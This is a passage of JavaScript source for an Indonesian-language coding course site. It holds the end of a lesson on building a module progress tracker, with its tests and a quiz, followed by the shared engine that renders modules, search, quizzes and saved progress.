const wadahDaftar = document.querySelector(&quot;#daftar-modul&quot;);
const teksProgres = document.querySelector(&quot;#ringkasan-progres&quot;);
const cetakanKartu = document.querySelector(&quot;#cetakan-kartu-modul&quot;);

function renderAplikasi() {
  const hasilSaring = saringModul(DATA_MODUL_AWAL, stateFilter);

  const simpulKartu = hasilSaring.map((modul) =&gt; {
    const fragmen = cetakanKartu.content.cloneNode(true);
    const artikel = fragmen.querySelector(&quot;.kartu-modul&quot;);
    const judulEl = fragmen.querySelector(&quot;.kartu-modul__judul&quot;);
    const infoEl = fragmen.querySelector(&quot;.kartu-modul__info&quot;);
    const tombol = fragmen.querySelector(&quot;.tombol-selesai&quot;);

    const sudahSelesai = penyimpan.apakahSelesai(modul.id);

    artikel.dataset.id = String(modul.id);
    artikel.classList.toggle(&quot;kartu-modul--selesai&quot;, sudahSelesai);

    // 100% Aman dari XSS karena menggunakan textContent
    judulEl.textContent = \`\${modul.id}. \${modul.judul}\`;
    infoEl.textContent = \`\${modul.tingkat} · \${modul.durasi} · Tag: \${modul.tag.join(&quot;, &quot;)}\`;

    tombol.dataset.aksi = &quot;toggle-selesai&quot;;
    tombol.setAttribute(&quot;aria-pressed&quot;, String(sudahSelesai));
    tombol.textContent = sudahSelesai ? &quot;✓ Selesai Dipelajari&quot; : &quot;Tandai Selesai&quot;;

    return fragmen;
  });

  wadahDaftar.replaceChildren(...simpulKartu);

  const { selesai, total, persen } = penyimpan.hitungRingkasan(DATA_MODUL_AWAL.length);
  teksProgres.textContent = \`Progres Belajar: \${selesai} dari \${total} modul selesai (\${persen}%)\`;
}

// 1. Event Delegation: Cukup SATU listener untuk seluruh tombol di dalam daftar!
wadahDaftar.addEventListener(&quot;click&quot;, (event) =&gt; {
  const tombol = event.target.closest(&quot;button[data-aksi='toggle-selesai']&quot;);
  if (!tombol || !wadahDaftar.contains(tombol)) return;

  const kartu = tombol.closest(&quot;.kartu-modul&quot;);
  const idModul = Number(kartu?.dataset.id);
  if (!idModul) return;

  penyimpan.toggleModul(idModul);
  renderAplikasi();
});

// 2. Pencarian dengan Debounce
const jalankanPencarian = buatDebounce((nilai) =&gt; {
  stateFilter.kataKunci = nilai;
  renderAplikasi();
}, 180);

inputCari.addEventListener(&quot;input&quot;, (e) =&gt; jalankanPencarian(e.target.value));

pilihTingkat.addEventListener(&quot;change&quot;, (e) =&gt; {
  stateFilter.tingkat = e.target.value;
  renderAplikasi();
});

// 3. Sinkronisasi Lintas Tab secara Real-Time
window.addEventListener(&quot;storage&quot;, (event) =&gt; {
  if (event.key === &quot;kodeloka:modul-selesai:v1&quot;) {
    penyimpan.muatUlang();
    renderAplikasi();
  }
});

renderAplikasi();</pre>
<h3>3. Berkas Pengujian Otomatis (<code>store.test.js</code>)</h3>
<pre>// Berkas: ./store.test.js
// Jalankan dengan: node --test store.test.js
import { describe, it } from &quot;node:test&quot;;
import assert from &quot;node:assert/strict&quot;;
import { PenyimpanProgres, saringModul } from &quot;./store.js&quot;;

describe(&quot;saringModul()&quot;, () =&gt; {
  const sampel = [
    { id: 1, judul: &quot;Dasar HTML&quot;, tingkat: &quot;Dasar&quot;, tag: [&quot;markup&quot;, &quot;dom&quot;] },
    { id: 2, judul: &quot;Async JavaScript&quot;, tingkat: &quot;Lanjut&quot;, tag: [&quot;promise&quot;, &quot;fetch&quot;] }
  ];

  it(&quot;menyaring berdasarkan kata kunci pada judul maupun tag tanpa peka huruf besar/kecil&quot;, () =&gt; {
    const hasil = saringModul(sampel, { kataKunci: &quot;FETCH&quot; });
    assert.equal(hasil.length, 1);
    assert.equal(hasil[0].id, 2);
  });

  it(&quot;menyaring berdasarkan tingkat kesulitan&quot;, () =&gt; {
    const hasil = saringModul(sampel, { tingkat: &quot;Dasar&quot; });
    assert.equal(hasil.length, 1);
    assert.equal(hasil[0].judul, &quot;Dasar HTML&quot;);
  });
});

describe(&quot;PenyimpanProgres&quot;, () =&gt; {
  it(&quot;menambah dan menghapus status selesai modul serta menghitung persentase dengan akurat&quot;, () =&gt; {
    const store = new PenyimpanProgres(&quot;kunci-uji&quot;);
    assert.equal(store.apakahSelesai(1), false);

    store.toggleModul(1);
    assert.equal(store.apakahSelesai(1), true);
    assert.deepEqual(store.hitungRingkasan(4), { selesai: 1, total: 4, persen: 25 });

    store.toggleModul(1);
    assert.equal(store.apakahSelesai(1), false);
  });
});</pre>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide" rel="noopener">JavaScript Guide — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model" rel="noopener">Document Object Model (DOM) — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API" rel="noopener">Using the Web Storage API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template" rel="noopener"><code>&lt;template&gt;</code> — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["Set","store.js","app.js","class","#","Map"],
    kuis: [
        {"tanya":"Dalam proyek aplikasi di atas, mengapa fungsi saringModul dan class PenyimpanProgres dipisahkan ke dalam berkas store.js yang tidak menyentuh document.querySelector sama sekali?","opsi":["Karena berkas app.js tidak mendukung penggunaan kata kunci class.","Agar logika bisnis dan pengelolaan data terpisah bersih dari ketergantungan DOM peramban (separation of concerns), sehingga store.js dapat langsung diuji secara cepat di terminal menggunakan node --test store.test.js tanpa memerlukan peramban!","Agar variabel di dalam store.js otomatis menjadi variabel global.","Karena localStorage tidak bisa dipanggil dari berkas yang memiliki querySelector."],"benar":1,"penjelasan":"Memisahkan logika pengolahan data murni (store.js) dari manipulasi antarmuka DOM (app.js) merupakan prinsip arsitektur perangkat lunak yang sangat penting: logika inti menjadi mudah dibaca, mudah digunakan ulang, dan dapat diuji langsung dengan unit test di Node.js dalam hitungan milidetik."},
        {"tanya":"Bagaimana aplikasi di atas memastikan pengguna pembaca layar mengetahui apakah tombol \"Tandai Selesai\" pada suatu kartu modul sedang dalam keadaan aktif (sudah selesai) atau belum?","opsi":["Hanya dengan mengubah warna latar belakang tombol menjadi hijau di CSS.","Dengan memperbarui atribut tombol.setAttribute(\"aria-pressed\", String(sudahSelesai)) menjadi \"true\" atau \"false\" sekaligus memperbarui textContent tombolnya.","Dengan menyembunyikan tombol menggunakan display: none.","Dengan memindahkan tombol ke bagian bawah halaman."],"benar":1,"penjelasan":"Mengandalkan perubahan warna saja tidak dapat diamati oleh pengguna pembaca layar. Memasang atribut aria-pressed=\"true\" / \"false\" menjadikan tombol tersebut sebagai toggle button aksesibel yang statusnya diumumkan secara jelas oleh pembaca layar."},
        {"tanya":"Apa peran dari cetakanKartu.content.cloneNode(true) saat merender daftar kartu modul di dalam fungsi renderAplikasi()?","opsi":["Mengunduh ulang berkas HTML dari server untuk setiap kartu.","Menggandakan seluruh struktur pohon elemen di dalam <template id=\"cetakan-kartu-modul\"> secara mendalam (deep clone) di memori, sehingga kita tinggal mengisi textContent dan atributnya tanpa perlu merangkai innerHTML atau puluhan createElement manual.","Menghapus elemen <template> dari halaman setelah kartu pertama dibuat.","Menyimpan elemen kartu ke dalam IndexedDB."],"benar":1,"penjelasan":"Argumen true pada cloneNode(true) melakukan penggandaan mendalam (deep clone) terhadap isi DocumentFragment milik <template>, yang kemudian diisi dengan textContent secara aman dan dimasukkan sekaligus ke dalam DOM melalui wadahDaftar.replaceChildren(...simpulKartu)."}
    ]
}
];

/* ==========================================================================
   ENGINE PEMBELAJARAN — dipakai bersama oleh Kubernetes, PostgreSQL, Kafka
   ========================================================================== */

const KUNCI_SIMPAN = TOPIK_SLUG + "_progres";

let indeksAktif = 0;
let kategoriAktif = "SEMUA";
let kataCari = "";
let selesai = muatProgres();

function muatProgres() {
    try {
        return new Set(JSON.parse(localStorage.getItem(KUNCI_SIMPAN) || "[]"));
    } catch {
        return new Set();
    }
}

function simpanProgres() {
    try {
        localStorage.setItem(KUNCI_SIMPAN, JSON.stringify([...selesai]));
    } catch { /* penyimpanan tidak tersedia — abaikan */ }
}

function aturUlangProgres() {
    selesai = new Set();
    simpanProgres();
    render();
}

function daftarKategori() {
    return ["SEMUA", ...new Set(MODUL.map(m => m.kategori))];
}

function modulTersaring() {
    const q = kataCari.trim().toLowerCase();
    return MODUL.filter(m => {
        const cocokKategori = kategoriAktif === "SEMUA" || m.kategori === kategoriAktif;
        if (!cocokKategori) return false;
        if (!q) return true;
        return (m.judul + " " + m.ringkas + " " + (m.tag || []).join(" "))
            .toLowerCase().includes(q);
    });
}

function renderPil() {
    const wadah = document.getElementById("pilKategori");
    wadah.innerHTML = daftarKategori().map(k => `
        <button class="pil ${k === kategoriAktif ? "aktif" : ""}"
                onclick="pilihKategori(${JSON.stringify(k).replace(/"/g, "&quot;")})">
            ${k === "SEMUA" ? "Semua" : k}
        </button>`).join("");
}

function pilihKategori(k) {
    kategoriAktif = k;
    render();
}

function renderDaftar() {
    const wadah = document.getElementById("daftarModul");
    const hasil = modulTersaring();

    if (hasil.length === 0) {
        wadah.innerHTML = `<div class="kosong">Tidak ada modul yang cocok.</div>`;
        return;
    }

    let html = "";
    let kategoriTerakhir = null;
    for (const m of hasil) {
        if (m.kategori !== kategoriTerakhir) {
            kategoriTerakhir = m.kategori;
            html += `<div class="grup-kategori">${m.kategori}</div>`;
        }
        const i = MODUL.indexOf(m);
        html += `
            <div class="item-modul ${i === indeksAktif ? "aktif" : ""} ${selesai.has(m.id) ? "selesai" : ""}"
                 onclick="bukaModul(${i})">
                <div class="item-nomor">${selesai.has(m.id) ? "✓" : String(m.id).padStart(2, "0")}</div>
                <div class="item-teks">
                    <div class="item-judul">${m.judul}</div>
                    <div class="item-meta">${m.tingkat} · ${m.durasi}</div>
                </div>
            </div>`;
    }
    wadah.innerHTML = html;
}

function renderProgres() {
    const total = MODUL.length;
    const jumlah = selesai.size;
    document.getElementById("isiProgres").style.width = (jumlah / total * 100) + "%";
    document.getElementById("teksProgres").textContent = `${jumlah} dari ${total} selesai`;
}

function renderKonten() {
    const m = MODUL[indeksAktif];
    const konten = document.getElementById("konten");

    const perintah = (m.perintah || []).length === 0 ? "" : `
        <div class="perintah-contoh">
            <div class="perintah-kepala">Perintah yang sering dipakai</div>
            <div class="perintah-isi">
                ${m.perintah.map(p => `<div class="perintah-baris">${lolos(p)}</div>`).join("")}
            </div>
        </div>`;

    const kuis = (m.kuis || []).length === 0 ? "" : `
        <section class="kuis">
            <h3>Uji Pemahaman</h3>
            <div class="kuis-sub">Pilih jawaban untuk melihat penjelasannya.</div>
            ${m.kuis.map((q, qi) => `
                <div class="pertanyaan" id="q-${qi}">
                    <div class="pertanyaan-teks">${qi + 1}. ${lolos(q.tanya)}</div>
                    ${q.opsi.map((o, oi) => `
                        <button class="opsi" data-q="${qi}" data-o="${oi}"
                                onclick="jawab(${qi}, ${oi})">${lolos(o)}</button>`).join("")}
                    <div class="penjelasan" id="pj-${qi}" style="display:none"></div>
                </div>`).join("")}
        </section>`;

    konten.innerHTML = `
        <header class="kepala-modul">
            <span class="label-kategori">${m.kategori}</span>
            <h1>${lolos(m.judul)}</h1>
            <p class="ringkas">${lolos(m.ringkas)}</p>
        </header>
        <article class="artikel">${m.isi}</article>
        ${perintah}
        ${kuis}
        <nav class="nav-modul">
            <button class="tombol-nav" onclick="pindah(-1)" ${indeksAktif === 0 ? "disabled" : ""}>← Sebelumnya</button>
            <button class="tombol-nav utama" onclick="tandaiSelesai()">
                ${selesai.has(m.id) ? "✓ Sudah ditandai selesai" : "Tandai selesai"}
            </button>
            <button class="tombol-nav" onclick="pindah(1)" ${indeksAktif === MODUL.length - 1 ? "disabled" : ""}>Berikutnya →</button>
        </nav>`;

    window.scrollTo({ top: 0, behavior: "smooth" });
}

function lolos(s) {
    return String(s)
        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function jawab(qi, oi) {
    const m = MODUL[indeksAktif];
    const q = m.kuis[qi];
    const tombol = document.querySelectorAll(`.opsi[data-q="${qi}"]`);
    tombol.forEach((t, i) => {
        t.disabled = true;
        if (i === q.benar) t.classList.add("benar");
        else if (i === oi) t.classList.add("salah");
    });
    const pj = document.getElementById(`pj-${qi}`);
    pj.style.display = "block";
    pj.innerHTML = (oi === q.benar ? "<strong>Tepat.</strong> " : "<strong>Belum tepat.</strong> ") + lolos(q.penjelasan);
}

function bukaModul(i) {
    indeksAktif = i;
    render();
}

function pindah(delta) {
    const baru = indeksAktif + delta;
    if (baru >= 0 && baru < MODUL.length) bukaModul(baru);
}

function tandaiSelesai() {
    const id = MODUL[indeksAktif].id;
    if (selesai.has(id)) selesai.delete(id); else selesai.add(id);
    simpanProgres();
    render();
}

function render() {
    renderPil();
    renderDaftar();
    renderProgres();
    renderKonten();
}

document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("inputCari").addEventListener("input", e => {
        kataCari = e.target.value;
        renderDaftar();
    });
    document.addEventListener("keydown", e => {
        if (e.target.tagName === "INPUT") return;
        if (e.key === "ArrowLeft") pindah(-1);
        if (e.key === "ArrowRight") pindah(1);
    });
    const sub = document.getElementById("merekSub");
    if (sub) sub.textContent = `${MODUL.length} modul · ${TOPIK_SUB}`;
    render();
});
